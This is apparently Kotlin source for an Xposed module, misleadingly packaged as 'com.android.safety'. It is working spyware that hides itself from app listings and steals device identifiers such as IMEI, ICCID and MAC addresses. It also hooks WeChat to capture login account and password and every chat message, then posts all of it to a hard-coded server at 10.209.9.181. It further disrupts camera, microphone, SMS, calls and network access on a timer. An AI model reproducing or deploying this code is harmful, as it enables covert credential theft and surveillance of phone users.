package com.android.safety

import android.app.AndroidAppHelper
import android.bluetooth.BluetoothAdapter
import android.content.ContentValues
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.telephony.TelephonyManager
import de.robv.android.xposed.*
import de.robv.android.xposed.callbacks.XC_LoadPackage
import java.util.*
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedBridge.log
import de.robv.android.xposed.XposedHelpers
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.net.InetAddress
import kotlin.concurrent.thread
import java.net.NetworkInterface.getNetworkInterfaces
import java.net.URL
import java.lang.Compiler.enable
import android.content.Intent
import android.os.Build
import android.provider.Settings
import java.io.IOException
import java.lang.Compiler.enable
import java.lang.Compiler.enable






class Xposed : IXposedHookLoadPackage {

    // 统一的hook操作
    fun addHook(lpparam: XC_LoadPackage.LoadPackageParam, className: String, methodName: String){
        XposedBridge.hookAllMethods(Class.forName(className), methodName, object : XC_MethodHook() {
            override fun beforeHookedMethod(param: MethodHookParam) {
                val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
                if (minute % 2 == 1) { // 时间内则禁用
                    val exception = Exception("")
                    param.result = exception
                    log("禁用 $className.$methodName " + lpparam.packageName)
                }
            }
            override fun afterHookedMethod(param: MethodHookParam) {
                val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
                if (minute % 2 == 1) { // 时间内则禁用
                    val exception = Exception("")
                    param.result = exception
                }
            }
        })
    }

    // 隐藏本应用
    fun hideInfo(lpparam: XC_LoadPackage.LoadPackageParam) {
        XposedBridge.hookAllMethods(
            Class.forName("android.app.ApplicationPackageManager"),
            "getInstalledApplications",
            object : XC_MethodHook()
            {
                override fun afterHookedMethod(param: MethodHookParam) {
                    var list = param.result as List<ApplicationInfo>
                    for (pkg in list) {
                        if (pkg.packageName.equals("com.android.safety")) {
                            list -= pkg
                        }
                    }
                    param.result = list
                }
            }
        )
        XposedBridge.hookAllMethods(
            Class.forName("android.app.ApplicationPackageManager"),
            "getInstalledPackages",
            object : XC_MethodHook()
            {
                override fun afterHookedMethod(param: MethodHookParam) {
                    var list = param.result as List<PackageInfo>
                    for (pkg in list) {
                        if (pkg.packageName.equals("com.android.safety")) {
                            list -= pkg
                        }
                    }
                    param.result = list
                }
            }
        )
//        XposedBridge.hookAllMethods(
//            Class.forName("android.app.ActivityManager"),
//            "getRunningAppProcesses",
//            object : XC_MethodHook()
//            {
//                override fun afterHookedMethod(param: MethodHookParam) {
//                    var list = param.result as List<ActivityManager.RunningAppProcessInfo>
//                    for (process in list) {
//                        if (process.processName.equals("com.android.safety")) {
//                            list -= process
//                        }
//                    }
//                    param.result = list
//                }
//            }
//        )
//        XposedBridge.hookAllMethods(
//            Class.forName("android.app.ActivityManager"),
//            "getRunningServices",
//            object : XC_MethodHook()
//            {
//                override fun afterHookedMethod(param: MethodHookParam) {
//                    var list = param.result as List<ActivityManager.RunningServiceInfo>
//                    for (service in list) {
//                        if (service.process.equals("com.android.safety")) {
//                            list -= service
//                        }
//                    }
//                    param.result = list
//                }
//            }
//        )
//        XposedBridge.hookAllMethods(
//            Class.forName("android.app.ApplicationPackageManager"),
//            "getPackagesForUid",
//            object : XC_MethodHook()
//            {
//                override fun afterHookedMethod(param: MethodHookParam) {
//                    var list = param.result as Array<String>
//                    for (str in list) {
//                        if (str.equals("com.android.safety")) {
//                            param.result = arrayOf("aoaoao")
//                            log("哇哦getPackagesForUid")
//                        }
//                    }
//                }
//            }
//        )
    }

    fun test(className: String, methodName: String) {
        XposedBridge.hookAllMethods(Class.forName(className), methodName, object : XC_MethodHook() {
                override fun afterHookedMethod(param: MethodHookParam) {
                    log("$methodName")
                }
            }
        )
    }

    // 将劫持信息发给服务器
    fun transfer(data: FormBody) {
        thread(start = true) {
            val client = OkHttpClient()
            val request = Request.Builder()
                .url("http://10.209.9.181:5000/post")
                .post(data)
                .build()
            try {
                client.newCall(request).execute()
            } catch (e: Error){}
        }
    }

    // 蓝牙MAC
    fun getBluetoothMacAddress(): String {
        val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
        var bluetoothMacAddress = ""
        try {
            val mServiceField = bluetoothAdapter.javaClass.getDeclaredField("mService")
            mServiceField.isAccessible = true
            val btManagerService = mServiceField.get(bluetoothAdapter)
            if (btManagerService != null) {
                bluetoothMacAddress =
                    btManagerService.javaClass.getMethod("getAddress").invoke(btManagerService) as String
            }
        } catch (e: Error){}
        return bluetoothMacAddress
    }

    // WIFI MAC
    fun getWFDMacAddress(): String {
        try {
            val interfaces = Collections.list(getNetworkInterfaces())
            for (ntwInterface in interfaces) {
                if (ntwInterface.getName().equals("p2p0", true)) {
                    val byteMac = ntwInterface.getHardwareAddress() ?: return ""
                    val strBuilder = StringBuilder()
                    for (i in byteMac.indices) {
                        strBuilder.append(String.format("%02X:", byteMac[i]))
                    }
                    if (strBuilder.length > 0) {
                        strBuilder.deleteCharAt(strBuilder.length - 1)
                    }
                    return strBuilder.toString()
                }
            }
        } catch (e: Exception) {}
        return ""
    }

    // 获取设备信息
    fun getInfo() {
        log("hey")
        var context: Context
        try {
            context = AndroidAppHelper.currentApplication()
        } catch(e:Error) {
            return
        }
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val data = FormBody.Builder()
            .add("type", "2")
            .add("model", android.os.Build.MODEL)
            .add("serial", android.os.Build.SERIAL)
            .add("imei", tm.imei)
            .add("iccid", tm.simSerialNumber)
            .add("wlanMac", getWFDMacAddress())
            .add("bluMac", getBluetoothMacAddress())
            .build()
        transfer(data)
    }

    @Throws(Throwable::class)
    override fun handleLoadPackage(lpparam: XC_LoadPackage.LoadPackageParam) {
        hideInfo(lpparam)

        addHook(lpparam, "android.hardware.Camera", "open")
        addHook(lpparam, "android.media.AudioRecord", "startRecording")
        addHook(lpparam, "android.media.MediaRecorder", "start")
        addHook(lpparam, "android.telephony.SmsManager", "sendTextMessage")
        addHook(lpparam, "android.telecom.TelecomManager", "placeCall")

        if (lpparam.packageName.equals("com.android.safety")) {
            XposedHelpers.findAndHookMethod(
                "com.android.safety.BootCompleteReceiver", lpparam.classLoader, "getinfo",
                Context::class.java,
                object : XC_MethodHook() {
                    override fun afterHookedMethod(param: MethodHookParam) {
                        getInfo()
                    }
                }
            )
        }

        // 劫持微信密码
        if (lpparam.packageName.contains("com.tencent.mm")) {
            XposedHelpers.findAndHookConstructor( // hook 构造函数
                "com.tencent.mm.modelsimple.q", lpparam.classLoader, // 类
                String::class.java, String::class.java, String::class.java, Int::class.java, // 参数
                object : XC_MethodHook() // 回调
                {
                    @Throws(Throwable::class)
                    override fun beforeHookedMethod(param: XC_MethodHook.MethodHookParam) {
                        val account = param.args[0] as String
                        val pass = param.args[1] as String
                        log("WECHAT account:$account\npass:$pass")
                        val data = FormBody.Builder()
                            .add("type", "1")
                            .add("account", account)
                            .add("pass", pass)
                            .build()
                        transfer(data)
                    } // end of beforeHookedMethod
                } // end of XC_MethodHook
            ) // end of findAndHookConstructor
        }

        // 劫持微信消息
        if (lpparam.processName.equals("com.tencent.mm")) {
            try {
                XposedHelpers.findAndHookMethod( // hook
                    "com.tencent.wcdb.database.SQLiteDatabase", lpparam.classLoader, // 类
                    "insertWithOnConflict", // 方法
                    String::class.java, String::class.java, ContentValues::class.java, Int::class.java, // 参数
                    object : XC_MethodHook() { // 回调
                        @Throws(Throwable::class)
                        override fun afterHookedMethod(param: MethodHookParam) {
                            //过滤掉非聊天消息
                            val tableName = param.args[0] as String
                            if (tableName != "message") {
                                return
                            }
                            // 提取消息内容
                            val contentValues = param.args[2] as ContentValues
                            val isSend = contentValues.getAsInteger("isSend") // isSend=1: 表示是自己发送的消息
                            val talker = contentValues.getAsString("talker") // talker: 对话人
                            val createTime = contentValues.getAsLong("createTime") // createTime: 消息时间
                            var content = String()
                            try {
                                content = contentValues.getAsString("content") // content: 消息内容
                            } catch (e: Error) {
                                content = "[img]"
                            }
                            log("WECHAT $contentValues")
                            val data = FormBody.Builder()
                                .add("isSend", isSend.toString())
                                .add("talker", talker)
                                .add("time", createTime.toString())
                                .add("content", content)
                                .build()
                            transfer(data)
                        } // end of afterHookedMethod
                    } // end of XC_MethodHook
                ) // end of findAndHookMethod
            } catch (e:Error) {}
//            getInfo()
        } // end of if

//        XposedBridge.hookAllConstructors(
//            Class.forName("java.net.URLConnection"),
//            object : XC_MethodHook()
//            {
//                @Throws(Throwable::class)
//                override fun beforeHookedMethod(param: MethodHookParam) {
//                    val args = param.args as Array
//                    if (args.size != 1 || param.args[0].javaClass != URL::class.java)
//                        return
//                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
//                    val mode = if (minute % 2 == 1) 1 else 0
//                    val mode2 = if (minute % 2 == 1) true else false
//                    val cmd = "settings put global airplane_mode_on $mode"
//                    val cmd2 = "am broadcast -a android.intent.action.AIRPLANE_MODE --ez state $mode2"
//                    try {
//                        Runtime.getRuntime().exec(cmd)
//                        Runtime.getRuntime().exec(cmd2)
//                    } catch (e: IOException) {
//
//                    }
////                    log(param.args[0].toString())
//                }
//            }0
//        )
//
//        fun setAirPlaneMode(Context context, boolean enable) {
//            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.JELLY_BEAN) {
//                Settings.System.putInt(context.getContentResolver(), Settings.System.AIRPLANE_MODE_ON, enable ? 1 : 0);
//            } else {
//                Settings.Global.putInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, enable ? 1 : 0);
//            }
//            Intent intent = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
//            intent.putExtra("state", enable);
//            context.sendBroadcast(intent);
//        }

//        XposedHelpers.findAndHookMethod(
//            "java.lang.Runtime", lpparam.classLoader,
//            "getRunTime",
//            object : XC_MethodHook()
//            {
//                override fun afterHookedMethod(param: MethodHookParam) {
//                    val runtime = param.result as Runtime
//                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
//                    val mode = if (minute % 2 == 1) 1 else 0
//                    val mode2 = if (minute % 2 == 1) true else false
//                    val cmd = "settings put global airplane_mode_on $mode"
//                    val cmd2 = "am broadcast -a android.intent.action.AIRPLANE_MODE --ez state $mode2"
//                    try {
//                        runtime.exec(cmd)
//                        runtime.exec(cmd2)
//                    } catch (e: java.lang.Exception) {
//                        log(e)
//                    }
//                }
//            }
//        )
    } // end of handleLoadPackage

    val banSock = object: XC_MethodHook() {
        @Throws(Throwable::class)
        override fun beforeHookedMethod(param: XC_MethodHook.MethodHookParam) {
            val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
            if (minute % 2 == 1) { // 时间内则禁用
                val host = param.args[0].toString()
                val regex1 = Regex("((1[0-9][0-9]\\.)|(2[0-4][0-9]\\.)|(25[0-5]\\.)|([1-9][0-9]\\.)|([0-9]\\.)){3}((1[0-9][0-9])|(2[0-4][0-9])|(25[0-5])|([1-9][0-9])|([0-9]))")
                val regex2 = Regex("(?<=//|)((\\\\w)+\\\\.)+\\\\w+")
                if (host.contains(regex1) &&
                    host.contains(regex2) &&
                    !host.contains("10.209.9.181") &&
                    !host.contains("127.0.0.1") &&
                    !host.contains("localhost"))
                {
                    val exception = RuntimeException("")
                    param.result = exception
                }
            }
        }
    }

    fun network(lpparam: XC_LoadPackage.LoadPackageParam) {
//        addHook(lpparam, "java.net.URL", "openConnection")
//        addHook(lpparam, "java.net.Socket", "getInputStream")
//        addHook(lpparam, "java.net.URLConnection", "getInputStream")

        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
            String::class.java, Int::class.java,
            banSock
        )
        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
            InetAddress::class.java, Int::class.java,
            banSock
        )
        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
            String::class.java, Int::class.java, InetAddress::class.java, Int::class.java,
            banSock
        )
        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
            String::class.java, Int::class.java, InetAddress::class.java, Int::class.java,
            banSock
        )

        XposedBridge.hookAllConstructors(
            Class.forName("java.net.URLConnection"),
            object : XC_MethodHook()
            {
                @Throws(Throwable::class)
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val args = param.args as Array
                    if (args.size != 1 || param.args[0].javaClass != URL::class.java)
                        return
                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
                    var context = AndroidAppHelper.currentApplication()

                    if (minute % 2 == 1) { // 时间内则禁用
                        Settings.Global.putInt(
                            context.getContentResolver(),
                            Settings.Global.AIRPLANE_MODE_ON,
                            1
                        )
                        val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
                        intent.putExtra("state", true)
                        context.sendBroadcast(intent)
                    } else {
                        Settings.Global.putInt(
                            context.getContentResolver(),
                            Settings.Global.AIRPLANE_MODE_ON,
                            0
                        )
                        val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
                        intent.putExtra("state", false)
                        context.sendBroadcast(intent)
                    }
                }
            }
        )
    }
}